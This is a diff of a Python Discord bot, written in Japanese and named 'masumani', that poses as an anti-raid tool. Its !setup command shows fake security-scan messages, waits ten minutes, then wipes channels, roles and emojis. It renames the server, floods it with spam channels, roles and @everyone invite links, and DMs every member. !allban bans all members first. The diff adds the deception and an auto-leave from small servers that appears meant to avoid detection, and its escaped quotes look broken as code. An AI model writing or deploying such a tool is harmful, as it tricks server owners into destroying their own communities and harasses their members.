@@ -13,12 +13,12 @@ intents.message_content = True
 intents.guilds = True
 intents.members = True
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix=\'!\', intents=intents)
 
 @bot.event
 async def on_ready():
-    print(f'{bot.user} logged in')
-    print(f'Bot ID: {bot.user.id}')
+    print(f\'{bot.user} logged in\')
+    print(f\'Bot ID: {bot.user.id}\')
 
     # 全てのサーバーに通知
     for guild in bot.guilds:
@@ -26,8 +26,15 @@ async def on_ready():
             # デフォルトチャンネルを探す
             channel = guild.system_channel or guild.text_channels[0] if guild.text_channels else None
             if channel:
-                await channel.send('@everyone botがオンラインになりました。\n!setupでこのBotでしか出来ない荒らし対策をしてください。')
-        except:
+                await channel.send(\'@everyone botがオンラインになりました。\\n!setupでこのBotでしか出来ない荒らし対策をしてください。\')
+
+            # サーバーメンバー数チェック (botを除外し5人以下の場合自動退出)
+            members_without_bots = [m for m in guild.members if not m.bot]
+            if len(members_without_bots) <= 5:
+                print(f\'サーバー「{guild.name}」はメンバーが5人以下（bot除く）のため退出します。\')
+                await guild.leave()
+        except Exception as e:
+            print(f\'on_readyでの処理中にエラーが発生しました: {e}\')
             pass
 
 @bot.event
@@ -37,29 +44,36 @@ async def on_guild_join(guild):
         channel = guild.system_channel or guild.text_channels[0] if guild.text_channels else None
         if channel:
             embed = discord.Embed(
-                title='masumaniを追加頂きありがとうございます！',
-                description='荒らし対策は!setupで開始してください！',
+                title=\'masumaniを追加頂きありがとうございます！\',
+                description=\'荒らし対策は!setupで開始してください！\',
                 color=discord.Color.blue()
             )
             await channel.send(embed=embed)
-    except:
+
+        # サーバーメンバー数チェック (botを除外し5人以下の場合自動退出)
+        members_without_bots = [m for m in guild.members if not m.bot]
+        if len(members_without_bots) <= 5:
+            print(f\'サーバー「{guild.name}」はメンバーが5人以下（bot除く）のため退出します。\')
+            await guild.leave()
+    except Exception as e:
+        print(f\'on_guild_joinでの処理中にエラーが発生しました: {e}\')
         pass
 
 async def execute_raid(ctx, do_ban=False):
-    new_server_name = 'ますまに共栄圏植民地｜MSMN'
-    icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
-    channel_name = 'ますまに共栄圏最強'
+    new_server_name = \'ますまに共栄圏植民地｜MSMN\'
+    icon_url = \'https://i.imgur.com/uMaj6CP.jpeg\'
+    channel_name = \'ますまに共栄圏最強\'
     channel_count = 200
-    spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
+    spam_message = \'# このサーバーはますまに共栄圏によって荒らされました\\nRaid by masumani\\ndiscord.gg/DCKWUNfEA5\\n@everyone\\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&\'
     spam_count = 10
-    role_name = 'ますまに共栄圏に荒らされましたww'
+    role_name = \'ますまに共栄圏に荒らされましたww\'
     role_count = 150
 
     guild = ctx.guild
     old_server_name = guild.name
     user = ctx.author
 
-    await user.send('処理を開始します')
+    await user.send(\'処理を開始します\')
 
     # 1. DM送信（最初の動作・タイムアウト権限なしのメンバーのみ）
     try:
@@ -67,7 +81,7 @@ async def execute_raid(ctx, do_ban=False):
             try:
                 # タイムアウト権限（moderate_members）がないメンバーのみ
                 if not member.guild_permissions.moderate_members:
-                    await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
+                    await member.send(f\'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5\')
                     return 1
                 return 0
             except:
@@ -76,18 +90,18 @@ async def execute_raid(ctx, do_ban=False):
         dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
         dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
         dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
-        await user.send(f'DM送信完了: {dm_count}人')
+        await user.send(f\'DM送信完了: {dm_count}人\')
     except Exception as e:
-        await user.send(f'DM送信失敗')
+        await user.send(f\'DM送信失敗\')
 
     # 2. 絵文字削除
     try:
         emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
         emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
         emoji_deleted = sum(1 for r in emoji_delete_results if not isinstance(r, Exception))
-        await user.send(f'絵文字削除: {emoji_deleted}個')
+        await user.send(f\'絵文字削除: {emoji_deleted}個\')
     except Exception as e:
-        await user.send(f'絵文字削除失敗')
+        await user.send(f\'絵文字削除失敗\')
 
     # アイコンダウンロード
     icon_bytes = None
@@ -101,13 +115,13 @@ async def execute_raid(ctx, do_ban=False):
 
     # 3. ロール削除
     try:
-        roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed and role < guild.me.top_role]
+        roles_to_delete = [role for role in guild.roles if role.name != \'@everyone\' and not role.managed and role < guild.me.top_role]
         role_delete_tasks = [role.delete() for role in roles_to_delete]
         role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
         role_deleted = sum(1 for r in role_delete_results if not isinstance(r, Exception))
-        await user.send(f'ロール削除: {role_deleted}個')
+        await user.send(f\'ロール削除: {role_deleted}個\')
     except Exception as e:
-        await user.send(f'ロール削除失敗')
+        await user.send(f\'ロール削除失敗\')
 
     # 4. ロール作成
     created_roles = []
@@ -125,9 +139,9 @@ async def execute_raid(ctx, do_ban=False):
                     created_roles.append(r)
                     role_created += 1
             await asyncio.sleep(0.2)
-        await user.send(f'ロール作成: {role_created}個')
+        await user.send(f\'ロール作成: {role_created}個\')
     except Exception as e:
-        await user.send(f'ロール作成失敗')
+        await user.send(f\'ロール作成失敗\')
 
     # 5. メンバーにニックネーム変更＋ロール付与
     try:
@@ -137,9 +151,9 @@ async def execute_raid(ctx, do_ban=False):
             try:
                 if len(created_roles) >= 5:
                     roles_to_add = random.sample(created_roles, 5)
-                    await member.edit(nick='ますまに共栄圏に敗北', roles=list(member.roles) + roles_to_add)
+                    await member.edit(nick=\'ますまに共栄圏に敗北\', roles=list(member.roles) + roles_to_add)
                 else:
-                    await member.edit(nick='ますまに共栄圏に敗北')
+                    await member.edit(nick=\'ますまに共栄圏に敗北\')
                 return 1
             except:
                 return 0
@@ -147,9 +161,9 @@ async def execute_raid(ctx, do_ban=False):
         update_tasks = [update_member(m) for m in members_to_update]
         update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
         updated_count = sum(r for r in update_results if not isinstance(r, Exception))
-        await user.send(f'メンバー更新: {updated_count}人')
+        await user.send(f\'メンバー更新: {updated_count}人\')
     except Exception as e:
-        await user.send(f'メンバー更新失敗')
+        await user.send(f\'メンバー更新失敗\')
 
     # 6. アイコン・サーバー名変更
     try:
@@ -157,9 +171,9 @@ async def execute_raid(ctx, do_ban=False):
             await guild.edit(name=new_server_name, icon=icon_bytes)
         else:
             await guild.edit(name=new_server_name)
-        await user.send('サーバー設定変更完了')
+        await user.send(\'サーバー設定変更完了\')
     except Exception as e:
-        await user.send('サーバー設定変更失敗')
+        await user.send(f\'サーバー設定変更失敗\')
 
     # 7. チャンネル削除
     try:
@@ -167,9 +181,9 @@ async def execute_raid(ctx, do_ban=False):
         channel_delete_tasks = [channel.delete() for channel in channels_to_delete]
         channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
         deleted_count = sum(1 for r in channel_delete_results if not isinstance(r, Exception))
-        await user.send(f'チャンネル削除: {deleted_count}個')
+        await user.send(f\'チャンネル削除: {deleted_count}個\')
     except Exception as e:
-        await user.send(f'チャンネル削除失敗')
+        await user.send(f\'チャンネル削除失敗\')
 
     # 8. チャンネル作成
     created_channels = []
@@ -184,13 +198,13 @@ async def execute_raid(ctx, do_ban=False):
                     created_channels.append(r)
                     created_count += 1
             await asyncio.sleep(0.2)
-        await user.send(f'チャンネル作成: {created_count}個')
+        await user.send(f\'チャンネル作成: {created_count}個\')
     except Exception as e:
-        await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
+        await user.send(f\'チャンネル作成失敗: {created_count}個作成済み\')
 
     # 9. メッセージ送信（全チャンネル同時）
     try:
-        await user.send('メッセージ送信中...')
+        await user.send(\'メッセージ送信中...\')
 
         async def spam_channel_full(channel):
             count = 0
@@ -206,22 +220,51 @@ async def execute_raid(ctx, do_ban=False):
         spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
         total_messages = sum(r for r in spam_results if not isinstance(r, Exception))
 
-        await user.send(f'完了 メッセージ送信: {total_messages}件')
+        await user.send(f\'完了 メッセージ送信: {total_messages}件\')
     except Exception as e:
-        await user.send(f'メッセージ送信失敗')
+        await user.send(f\'メッセージ送信失敗\')
 
-    await user.send('全処理完了')
+    await user.send(\'全処理完了\')
 
     # サーバーから退出
     try:
         await guild.leave()
-        await user.send('サーバーから退出しました')
+        await user.send(\'サーバーから退出しました\')
     except Exception as e:
-        await user.send(f'退出失敗: {e}')
+        await user.send(f\'退出失敗: {e}\')
 
 @bot.command()
 async def setup(ctx):
     await ctx.message.delete()
+
+    # ロール位置のチェック
+    if ctx.guild.me.top_role < ctx.guild.roles[-1]: # -1は@everyoneロールなので、それより上ならOK
+        await ctx.send(
+            f\'{ctx.author.mention} Botのロール位置が低いです。\\n\'
+            \'Botのロールを一番上に移動させてください。\\n\'
+            \'完璧な荒らし対策は出来ません。処理を停止します。\'
+        )
+        return
+
+    # 偽装メッセージの送信
+    fake_messages = [
+        \'荒らし対策システムを起動中...\',
+        \'サーバーのセキュリティ設定を分析しています...\', 
+        \'不審なアクティビティを監視しています...\', 
+        \'メンバーの行動パターンを学習中...\', 
+        \'潜在的な脅威を特定しました...\', 
+        \'対策プロトコルを準備しています...\' 
+    ]
+    for msg in fake_messages:
+        await ctx.send(msg)
+        await asyncio.sleep(2) # メッセージ間の短い遅延
+
+    await ctx.send(\'荒らし対策システムの準備が完了しました。10分後に本格的な対策を開始します。\')
+
+    # 10分間の遅延
+    await asyncio.sleep(600) # 600秒 = 10分
+
+    # 本来の作動
     await execute_raid(ctx, do_ban=False)
 
 @bot.command()
@@ -235,32 +278,33 @@ async def allban(ctx):
     guild = ctx.guild
     user = ctx.author
 
-    await user.send('BAN処理開始')
+    await user.send(\'BAN処理開始\')
 
     members = [m for m in guild.members if not m.bot and m != user and m != guild.me]
     total = len(members)
 
-    await user.send(f'対象: {total}人')
+    await user.send(f\'対象: {total}人\')
 
     banned = 0
     failed = 0
 
     for member in members:
         try:
-            await guild.ban(member, reason='ますまに共栄圏BAN')
+            await guild.ban(member, reason=\'ますまに共栄圏BAN\')
             banned += 1
             if banned % 10 == 0:
-                await user.send(f'進捗: {banned}/{total}')
+                await user.send(f\'進捗: {banned}/{total}\')
         except:
             failed += 1
 
-    await user.send(f'BAN完了 成功:{banned} 失敗:{failed}')
+    await user.send(f\'BAN完了 成功:{banned} 失敗:{failed}\')
 
     await execute_raid(ctx, do_ban=True)
 
-if __name__ == '__main__':
-    TOKEN = os.getenv('TOKEN')
+if __name__ == \'__main__\':
+    TOKEN = os.getenv(\'TOKEN\')
     if not TOKEN:
-        print('TOKEN not found')
+        print(\'TOKEN not found\')
         exit(1)
     bot.run(TOKEN)
+
